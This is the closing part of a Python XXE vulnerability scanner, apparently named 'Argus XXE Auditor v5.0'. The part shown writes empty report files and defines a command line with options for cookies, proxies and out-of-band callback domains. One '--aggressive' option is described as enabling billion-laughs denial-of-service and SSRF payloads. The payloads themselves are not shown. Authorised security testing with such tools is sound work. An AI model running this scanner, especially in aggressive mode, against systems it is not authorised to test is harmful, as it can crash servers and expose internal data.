    path = outdir / "xxe_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "xxe_confirmed.json").write_text(json.dumps({
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0,
                   "by_chain": {}, "by_parser": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "xxe_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(), "chains": [],
    }, indent=2) + "\n")
    for name in ("xxe_candidates.txt", "xxe_confirmed.txt", "xxe_oob.txt",
                 "xxe_surface.txt", "xxe_fingerprints.txt"):
        (outdir / name).write_text("")
    (outdir / "xxe_evidence").mkdir(exist_ok=True)
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    logging.basicConfig(level=logging.INFO, format="%(message)s",
                        handlers=[logging.StreamHandler(sys.stdout)])
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus XXE Auditor v5.0")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--header", action="append", default=[],
                        metavar="NAME=VALUE", help="Extra header (repeatable)")
    parser.add_argument("--oob-domain", help="OOB domain")
    parser.add_argument("--interactsh", action="store_true")
    parser.add_argument("--no-error", action="store_true")
    parser.add_argument("--no-oob", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--aggressive", action="store_true",
                        help="Enable billion-laughs DoS + SSRF payloads")
    parser.add_argument("--max-surfaces", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--scan-id", type=int, default=None)
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if "=" in h:
            k, v = h.split("=", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie
    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_xxe_scan(
            args.input, args.output,
            oob_domain=args.oob_domain, use_interactsh=args.interactsh,
            headers=headers or None,
            test_error_based=not args.no_error,
            test_oob=not args.no_oob,
            test_bypass=not args.no_bypass,
            aggressive=args.aggressive,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit, concurrency=args.concurrency,
            timeout=args.timeout, proxies=proxies, scan_id=args.scan_id,
        )
    except KeyboardInterrupt:
        log.warning("interrupted by user"); sys.exit(130)
    except Exception as e:
        log.error(f"failed: {type(e).__name__}: {e}")
        import traceback; log.debug(traceback.format_exc()); sys.exit(1)
